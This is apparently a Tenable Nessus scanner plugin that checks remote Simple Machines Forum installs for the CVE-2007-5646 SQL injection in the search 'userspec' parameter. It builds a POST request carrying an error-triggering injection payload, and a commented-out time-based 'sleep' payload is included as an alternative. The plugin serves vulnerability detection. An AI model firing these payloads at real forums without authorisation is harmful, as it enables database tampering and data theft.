#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(27585);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-5646");
  script_bugtraq_id(26144);
  script_xref(name:"OSVDB", value:"38070");

  script_name(english:"Simple Machines Forum Search.php SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Simple Machines Forum (SMF), an open-source
web forum application written in PHP. 

The version of Simple Machines Forum installed on the remote host
fails to sanitize user input to the 'userspec' parameter used in
conjunction with the 'search2' action to the 'index.php' script before
using it in a Sources/Search.php database query.  Regardless of PHP's 
'magic_quotes_gpc' setting, an attacker may be able to exploit this 
issue to manipulate such queries, leading to disclosure of sensitive 
information, modification of data, or attacks against the underlying 
database. 

Note that an unauthenticated attacker can exploit this issue only if
SMF is configured to use MySQL 5.x, but an authenticated attacker can
do so regardless of the database version in use." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/482569/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.simplemachines.org/community/index.php?topic=196380.0" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Simple Machines Forum 1.1.4 / 1.0.12 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/forum", "/smf", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/Sources/Search.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # If so...
  if ("Hacking attempt..." >< res)
  {
    # Try to exploit the issue.
    #
    # nb: this should catch vulnerable versions of SMF even if they're
    #     not using MySQL 5.
    exploit = string('"nessus\\", ', SCRIPT_NAME);
    # nb: uncomment for an alternate exploit -- the response will be delayed.
    #delay = 4;
    #exploit = string('"\\"," or  (IF(GREATEST(1,0)!=0,sleep(', delay, '),1) and 1=1) limit 1,1 #"');

    exploit = urlencode(str:exploit);
    exploit = str_replace(string:exploit, find:"%20", replace:"+");

    postdata = string(
      "advanced=1&",
      "search=1&",
      "searchtype=1&",
      "userspec=", exploit, "&",
      "minage=0&",
      "maxage=9999&",
      "sort=relevance|desc&",
      "brd[1]=1"
    );
    req = string(
      "POST ", dir, "/?action=search2 HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(res)) exit(0);

    # If it looks like the exploit worked...
    if ("title>Database Error" >< res)
    {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
